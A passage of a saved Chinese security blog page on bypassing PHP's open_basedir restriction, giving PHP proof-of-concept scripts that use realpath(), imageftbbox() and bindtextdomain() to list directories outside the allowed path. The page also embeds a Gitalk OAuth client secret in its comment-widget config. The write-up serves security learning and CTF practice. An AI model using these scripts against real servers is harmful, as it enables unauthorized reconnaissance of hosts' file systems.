+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>当然由于&lt;&gt;&lt;是Windows特有的通配符。所以该POC只能在Windows环境下使用。Linux下只能暴力破解。</p>
+
+<h1 id="利用realpath绕过">利用realpath()绕过</h1>
+<p>realpath()函数和SplFileInfo::getRealPath()作用类似。同样是可以得到绝对路径。函数定义如下:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">realpath</span> <span class="p">(</span> <span class="n">string</span> <span class="nv">$path</span> <span class="p">)</span> <span class="o">:</span> <span class="n">string</span>
+</code></pre></div></div>
+<p>当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误（File is not within the allowed path(s)）。
+同样，对于这个函数，我们在Windows下仍然能够使用通配符&lt;&gt;来列目录，有P神的脚本如下:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
+<span class="nb">printf</span><span class="p">(</span><span class="s2">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span><span class="p">,</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">));</span>
+<span class="nb">set_error_handler</span><span class="p">(</span><span class="s1">'isexists'</span><span class="p">);</span>
+<span class="nv">$dir</span> <span class="o">=</span> <span class="s1">'d:/test/'</span><span class="p">;</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$chars</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyz0123456789_'</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="mf">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'&lt;&gt;&lt;'</span><span class="p">;</span>
+    <span class="nb">realpath</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">isexists</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">'/File\((.*)\) is not within/'</span><span class="p">;</span>
+    <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nb">printf</span><span class="p">(</span><span class="s2">"%s &lt;br/&gt;"</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>realpath()和SplFileInfo::getRealPath()的区别在于,realpath()只有在启用了open_basedir()限制的情况下才能使用这种思路爆目录，而SplFileInfo::getRealPath()可以无视是否开启open_basedir进行列目录(当然，没有开启open_basedir也没必要花这么大的功夫来列目录了)</p>
+
+<h1 id="利用imageftbbox绕过">利用imageftbbox()绕过</h1>
+<p>GD库一般是PHP必备的扩展库之一，当中的imageftbbox()函数也可以起到像realpath()一样的列目录效果。<br>
+其思想也和open_basedir类似。这个函数第三个参数是字体的路径。我发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。
+有POC如下:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">?</span><span class="n">php</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
+<span class="nb">printf</span><span class="p">(</span><span class="s2">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span><span class="p">,</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">));</span>
+<span class="nb">set_error_handler</span><span class="p">(</span><span class="s1">'isexists'</span><span class="p">);</span>
+<span class="nv">$dir</span> <span class="o">=</span> <span class="s1">'d:/test/'</span><span class="p">;</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$chars</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyz0123456789_'</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="mf">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'&lt;&gt;&lt;'</span><span class="p">;</span>
+    <span class="c1">//$m = imagecreatefrompng("zip.png");</span>
+    <span class="c1">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, 'aaa');</span>
+    <span class="nb">imageftbbox</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="nv">$file</span><span class="p">,</span> <span class="s1">'aaa'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">isexists</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">global</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="nv">$errstr</span><span class="p">,</span> <span class="s1">'Invalid font filename'</span><span class="p">)</span> <span class="o">===</span> <span class="kc">FALSE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">printf</span><span class="p">(</span><span class="s2">"%s&lt;br/&gt;"</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>但是貌似用这种方法进行列目录的话，只能一位一位猜解，具体可以参考P神的文章<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html#0x03-realpath">PHP绕过open_basedir列目录的研究</a><br>
+总之感觉是挺鸡肋的方法，而且和上面的两种方法类似，由于都使用了Windows的通配符，所以这些POC都只能在Windows下使用，Linux下只能暴力猜解。</p>
+
+<h1 id="利用bindtextdomain绕过">利用bindtextdomain()绕过</h1>
+<h2 id="bindtextdomain函数">bindtextdomain()函数</h2>
+<p>bindtextdomain是php下绑定domain到某个目录的函数。用法如下:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">bindtextdomain</span> <span class="p">(</span> <span class="n">string</span> <span class="nv">$domain</span> <span class="p">,</span> <span class="n">string</span> <span class="nv">$directory</span> <span class="p">)</span> <span class="o">:</span> <span class="n">string</span>
+</code></pre></div></div>
+<p>第一个参数随便传都行，主要出在第二个参数上，当第二个参数即目录存在时，会返回目录的路径，当目录不存在时，会返回False。故有脚本如下:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$re</span> <span class="o">=</span> <span class="nb">bindtextdomain</span><span class="p">(</span><span class="s1">'xxx'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">]);</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$re</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>这个方法只能用暴力猜解的方法来判断文件是否存在，而且只能在Linux环境下使用，可以说相当鸡肋了。</p>
+
+<h1 id="总结">总结</h1>
+<p>emmm，不知不觉又水完了一篇文章，就感觉大多数对open_basedir的绕过都还是存在着各种各样的局限，大部分只能列目录就不说了，而且还存在着对PHP版本有限制、Linux(Windows)不能通杀、需要采用暴力破解的问题。<br>
+反正我感觉在实战或者是CTF中，遇到了open_basedir的限制，有时不比在绕过open_basedir上死磕，或许直接寻找有无RCE的方法有时反倒能够让你柳暗花明(毕竟执行系统函数就是绕过open_basedir的一种方法)<br>
+最后说一句，PHITHON，永远滴神！</p>
+
+<h1 id="参考文章">参考文章</h1>
+<p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html#0x03-realpath">PHP绕过open_basedir列目录的研究</a><br>
+<a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html">php5全版本绕过open_basedir读文件脚本</a><br>
+<a href="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/">浅谈几种Bypass open_basedir的方法</a><br>
+<a href="https://www.jianshu.com/p/cf2cd07d02cf">PHP绕过open_basedir限制操作文件的三种方法</a></p>
+
+
+
+                <hr style="visibility: hidden;">
+
+                
+
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="https://www.v0n.top/2020/05/01/%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8Docker%E5%87%BA%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9B%AE/" data-toggle="tooltip" data-placement="top" title="如何正确使用Docker出一道CTF题目">
+                        Previous<br>
+                        <span>如何正确使用Docker出一道CTF题目</span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="https://www.v0n.top/2020/08/14/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E6%80%BB%E7%BB%93/" data-toggle="tooltip" data-placement="top" title="无字母数字webshell总结">
+                        Next<br>
+                        <span>无字母数字webshell总结</span>
+                        </a>
+                    </li>
+                    
+                </ul>
+		    
+		 
+                <!--Gitalk评论start  -->
+                
+                <!-- 引入Gitalk评论插件  -->
+                <link rel="stylesheet" href="./open_basedir绕过 - Von的博客 _ Von Blog_files/gitalk.css">
+                <script src="./open_basedir绕过 - Von的博客 _ Von Blog_files/gitalk.min.js.下载"></script>
+                <div id="gitalk-container"><div class="gt-container"><div class="gt-meta"><span class="gt-counts"><a class="gt-link gt-link-counts" href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/null" target="_blank" rel="noopener noreferrer">0</a> 条评论</span><div class="gt-user"><div class="gt-user-inner"><span class="gt-user-name">未登录用户</span><span class="gt-ico gt-ico-arrdown"><span class="gt-svg"><svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" p-id="1619"><path d="M511.872 676.8c-0.003 0-0.006 0-0.008 0-9.137 0-17.379-3.829-23.21-9.97l-251.277-265.614c-5.415-5.72-8.743-13.464-8.744-21.984 0-17.678 14.33-32.008 32.008-32.008 9.157 0 17.416 3.845 23.25 10.009l228.045 241.103 228.224-241.088c5.855-6.165 14.113-10.001 23.266-10.001 8.516 0 16.256 3.32 21.998 8.736 12.784 12.145 13.36 32.434 1.264 45.233l-251.52 265.6c-5.844 6.155-14.086 9.984-23.223 9.984-0.025 0-0.051 0-0.076 0z" p-id="1620"></path></svg></span></span></div></div></div><div class="gt-error">Error: Request aborted</div><div class="gt-header"><a class="gt-avatar-github"><span class="gt-ico gt-ico-github"><span class="gt-svg"><svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64 524C64 719.602 189.356 885.926 364.113 947.017 387.65799 953 384 936.115 384 924.767L384 847.107C248.118 863.007 242.674 773.052 233.5 758.001 215 726.501 171.5 718.501 184.5 703.501 215.5 687.501 247 707.501 283.5 761.501 309.956 800.642 361.366 794.075 387.658 787.497 393.403 763.997 405.637 743.042 422.353 726.638 281.774 701.609 223 615.67 223 513.5 223 464.053 239.322 418.406 271.465 381.627 251.142 320.928 273.421 269.19 276.337 261.415 334.458 256.131 394.888 302.993 399.549 306.685 432.663 297.835 470.341 293 512.5 293 554.924 293 592.81 297.896 626.075 306.853 637.426 298.219 693.46 258.054 747.5 262.966 750.382 270.652 772.185 321.292 753.058 381.083 785.516 417.956 802 463.809 802 513.5 802 615.874 742.99 701.953 601.803 726.786 625.381 750.003 640 782.295 640 818.008L640 930.653C640.752 939.626 640 948.664978 655.086 948.665 832.344 888.962 960 721.389 960 524 960 276.576 759.424 76 512 76 264.577 76 64 276.576 64 524Z"></path>
+</svg>
+</span></span></a><div class="gt-header-comment"><textarea class="gt-header-textarea " placeholder="说点什么" style="overflow: hidden; overflow-wrap: break-word; resize: none; height: 71.6px;"></textarea><div class="gt-header-preview markdown-body hide"></div><div class="gt-header-controls"><a class="gt-header-controls-tip" href="https://guides.github.com/features/mastering-markdown/" target="_blank" rel="noopener noreferrer"><span class="gt-ico gt-ico-tip"><span class="gt-svg"><svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 366.949535c-16.065554 0-29.982212 13.405016-29.982212 29.879884l0 359.070251c0 16.167882 13.405016 29.879884 29.982212 29.879884 15.963226 0 29.879884-13.405016 29.879884-29.879884L541.879884 396.829419C541.879884 380.763865 528.474868 366.949535 512 366.949535L512 366.949535z" p-id="3083"></path>
+  <path d="M482.017788 287.645048c0-7.776956 3.274508-15.553912 8.80024-21.181973 5.525732-5.525732 13.302688-8.80024 21.181973-8.80024 7.776956 0 15.553912 3.274508 21.079644 8.80024 5.525732 5.62806 8.80024 13.405016 8.80024 21.181973 0 7.776956-3.274508 15.656241-8.80024 21.181973-5.525732 5.525732-13.405016 8.697911-21.079644 8.697911-7.879285 0-15.656241-3.274508-21.181973-8.697911C485.292295 303.301289 482.017788 295.524333 482.017788 287.645048L482.017788 287.645048z" p-id="3084"></path>
+  <path d="M512 946.844409c-239.8577 0-434.895573-195.037873-434.895573-434.895573 0-239.8577 195.037873-434.895573 434.895573-434.895573 239.755371 0 434.895573 195.037873 434.895573 434.895573C946.895573 751.806535 751.755371 946.844409 512 946.844409zM512 126.17088c-212.740682 0-385.880284 173.037274-385.880284 385.777955 0 212.740682 173.037274 385.777955 385.880284 385.777955 212.740682 0 385.777955-173.037274 385.777955-385.777955C897.777955 299.208154 724.740682 126.17088 512 126.17088z" p-id="3085"></path>
+</svg>
+</span><span class="gt-ico-text">支持 Markdown 语法</span></span></a><button class="gt-btn gt-btn-preview"><span class="gt-btn-text">预览</span></button><button class="gt-btn gt-btn-login"><span class="gt-btn-text">使用 GitHub 登录</span></button></div></div></div><div class="gt-comments"><div style="position: relative;"></div><p class="gt-comments-null">来做第一个留言的人吧！</p></div></div></div>
+                <!-- 引入一个生产md5的js，用于对id值进行处理，防止其过长 -->
+                <!-- Thank DF:https://github.com/NSDingFan/NSDingFan.github.io/issues/3#issuecomment-407496538 -->
+                <script src="./open_basedir绕过 - Von的博客 _ Von Blog_files/md5.min.js.下载"></script>
+                <script type="text/javascript">
+                    var gitalk = new Gitalk({
+                    clientID: 'ff22566f9426862ef6c8',
+                    clientSecret: 'c04c81f6db80f890cf38cd65bed298525aeaaa87',
+                    repo: 'issue',
+                    owner: 'VonLYC',
+                    admin: ['VonLYC'],
+                    distractionFreeMode: false,
+                    id: md5(location.pathname),
+                    });
+                    gitalk.render('gitalk-container');
+                </script>
+                
+                <!-- Gitalk end -->
+
+                
+
+                
+
+            </div>  
+
+    <!-- Side Catalog Container -->
+        
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog fixed">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"><li class="h1_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#%E4%BB%80%E4%B9%88%E6%98%AFopen_basedir" rel="nofollow">什么是open_basedir</a></li><li class="h1_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#%E6%9C%AC%E7%AF%87%E6%B5%8B%E8%AF%95%E8%84%9A%E6%9C%AC" rel="nofollow">本篇测试脚本</a></li><li class="h1_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#%E9%80%9A%E8%BF%87%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87" rel="nofollow">通过系统命令执行绕过</a></li><li class="h1_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#%E5%88%A9%E7%94%A8glob%E7%BB%95%E8%BF%87" rel="nofollow">利用glob://绕过</a></li><li class="h2_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#glob%E4%BC%AA%E5%8D%8F%E8%AE%AE" rel="nofollow">glob://伪协议</a></li><li class="h2_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#directoryiteratorglob" rel="nofollow">DirectoryIterator+glob://</a></li><li class="h2_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#scandirglob" rel="nofollow">scandir()+glob://</a></li><li class="h2_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#opendirreaddirglob" rel="nofollow">opendir()+readdir()+glob://</a></li><li class="h1_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#%E5%88%A9%E7%94%A8symlink%E7%BB%95%E8%BF%87" rel="nofollow">利用symlink()绕过</a></li><li class="h2_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#symlink%E5%87%BD%E6%95%B0" rel="nofollow">symlink()函数</a></li><li class="h2_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#poc%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90" rel="nofollow">POC及原理分析</a></li><li class="h1_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#%E5%88%A9%E7%94%A8ini_set%E7%BB%95%E8%BF%87" rel="nofollow">利用ini_set()绕过</a></li><li class="h2_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#ini_set%E5%87%BD%E6%95%B0" rel="nofollow">ini_set()函数</a></li><li class="h2_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#poc" rel="nofollow">POC</a></li><li class="h1_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#%E5%88%A9%E7%94%A8splfileinfogetrealpath%E7%B1%BB%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87" rel="nofollow">利用SplFileInfo::getRealPath()类方法绕过</a></li><li class="h1_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#%E5%88%A9%E7%94%A8realpath%E7%BB%95%E8%BF%87" rel="nofollow">利用realpath()绕过</a></li><li class="h1_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#%E5%88%A9%E7%94%A8imageftbbox%E7%BB%95%E8%BF%87" rel="nofollow">利用imageftbbox()绕过</a></li><li class="h1_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#%E5%88%A9%E7%94%A8bindtextdomain%E7%BB%95%E8%BF%87" rel="nofollow">利用bindtextdomain()绕过</a></li><li class="h2_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#bindtextdomain%E5%87%BD%E6%95%B0" rel="nofollow">bindtextdomain()函数</a></li><li class="h1_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#%E6%80%BB%E7%BB%93" rel="nofollow">总结</a></li><li class="h1_nav"><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0" rel="nofollow">参考文章</a></li></ul>
+                </div>
+            </div>
+        
+
+    <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="https://www.v0n.top/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Practice" title="Practice" rel="3">
+                                    Practice
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#SQL" title="SQL" rel="9">
+                                    SQL
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Web" title="Web" rel="23">
+                                    Web
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#CTF" title="CTF" rel="5">
+                                    CTF
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Crypto" title="Crypto" rel="3">
+                                    Crypto
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Docker" title="Docker" rel="2">
+                                    Docker
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#PHP" title="PHP" rel="7">
+                                    PHP
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB" title="文件包含" rel="2">
+                                    文件包含
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#%E6%9D%82%E8%B0%88" title="杂谈" rel="1">
+                                    杂谈
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#%E7%BC%96%E7%A0%81" title="编码" rel="1">
+                                    编码
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Python" title="Python" rel="3">
+                                    Python
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#%E7%88%AC%E8%99%AB" title="爬虫" rel="1">
+                                    爬虫
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D" title="问题修复" rel="1">
+                                    问题修复
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Linux" title="Linux" rel="1">
+                                    Linux
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Math" title="Math" rel="1">
+                                    Math
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Java" title="Java" rel="4">
+                                    Java
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#SSRF" title="SSRF" rel="2">
+                                    SSRF
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#XXE" title="XXE" rel="1">
+                                    XXE
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Flask" title="Flask" rel="1">
+                                    Flask
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" title="反序列化" rel="1">
+                                    反序列化
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#%E5%87%BA%E9%A2%98" title="出题" rel="1">
+                                    出题
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#%E7%BC%96%E7%A8%8B" title="编程" rel="1">
+                                    编程
+                                </a>
+                            
+        				
+        			</div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+                    
+                        <li><a href="https://www.xdsec.org/">XDSEC</a></li>
+                    
+                        <li><a href="http://hed9eh0g.top/">Hed9eh0g</a></li>
+                    
+                        <li><a href="https://wsbfdzz.github.io/">小雨时宁</a></li>
+                    
+                        <li><a href="http://www.xdusund.com/">sund</a></li>
+                    
+                        <li><a href="https://icebagw.github.io/">icebag</a></li>
+                    
+                        <li><a href="http://39.105.105.208/">Wal1et</a></li>
+                    
+                        <li><a href="https://nopech.cn/">nopech</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+ <style>
+  table{
+    border-left:1px solid #000000;border-top:1px solid #000000;
+    width: 100%;
+    word-wrap:break-word; word-break:break-all;
+  }
+  table th{
+  text-align:center;
+  }
+  table th,td{
+    border-right:1px solid #000000;border-bottom:1px solid #000000;
+  }
+</style>
+	
+	
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("//cdnjs.cloudflare.com/ajax/libs/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+<!-- jQuery -->
+<!--<script src="/js/jquery.min.js "></script>-->
+<script src="./open_basedir绕过 - Von的博客 _ Von Blog_files/jquery.min.js.下载"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+<!--<script src="/js/bootstrap.min.js "></script>-->
+<script src="./open_basedir绕过 - Von的博客 _ Von Blog_files/bootstrap.min.js.下载"></script>
+<script src="./open_basedir绕过 - Von的博客 _ Von Blog_files/canvas-nest.min.js.下载"></script><canvas id="c_n14" width="1298" height="616" style="position: fixed; top: 0px; left: 0px; z-index: -1; opacity: 0.5;"></canvas>
+
+
+<footer translate="no">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+                    <!-- add jianshu add target = "_blank" to <a> by BY -->
+                    
+                    
+
+                    <!-- add Weibo, Zhihu by Hux, add target = "_blank" to <a> by Hux -->
+                    
+                    
+
+
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/VonLYC">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright © Von's Blog 2022
+                    <br>
+                    Theme on <a href="https://github.com/VonLYC/VonLYC.github.io.git">GitHub</a> |
+                    <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="100px" height="20px" src="./open_basedir绕过 - Von的博客 _ Von Blog_files/github-btn.html">
+                    </iframe>
+                    <br>
+                    本站访客量为<span id="busuanzi_value_site_pv"></span>
+                    <br>
+                    </p><p class="copyright text-muted" id="count">我的博客已默默运行了1465天23时29分42秒</p>
+            </div>
+        </div>
+    </div>
+    
+    <div class="cb-search-tool" style="position: fixed; top: 0px ; bottom: 0px; left: 0px; right:  0px;
+      opacity: 0.95; background-color: #111111; z-index: 9999; display: none;">
+        <input type="text" class="form-control cb-search-content" id="cb-search-content" style="position: fixed; top: 60px" placeholder="文章标题 日期 标签">
+
+        <div style="position: fixed; top: 16px; right: 16px;">
+        <img src="./open_basedir绕过 - Von的博客 _ Von Blog_files/cb-close.png" id="cb-close-btn">
+        </div>
+    </div>
+
+    <div style="position: fixed; right: 16px; bottom: 20px;">
+        <img src="./open_basedir绕过 - Von的博客 _ Von Blog_files/cb-search.png" id="cb-search-btn" title="双击ctrl试一下">
+    </div>
+
+    <link rel="stylesheet" href="./open_basedir绕过 - Von的博客 _ Von Blog_files/cb-search.css">
+
+    <script src="./open_basedir绕过 - Von的博客 _ Von Blog_files/bootstrap3-typeahead.min.js.下载"></script>
+    <script src="./open_basedir绕过 - Von的博客 _ Von Blog_files/cb-search.js.下载"></script>
+
+</footer>
+
+<script async="" src="./open_basedir绕过 - Von的博客 _ Von Blog_files/busuanzi.pure.mini.js.下载"></script>
+
+<script>
+  
+  window.setInterval('counter()',1000);
+  function counter(){
+    var date=new Date();
+    var startDate=new Date(2019,5,19,0,0,0);
+    var time=(date-startDate)/1000;
+    var day=Math.floor(time/(24*60*60));
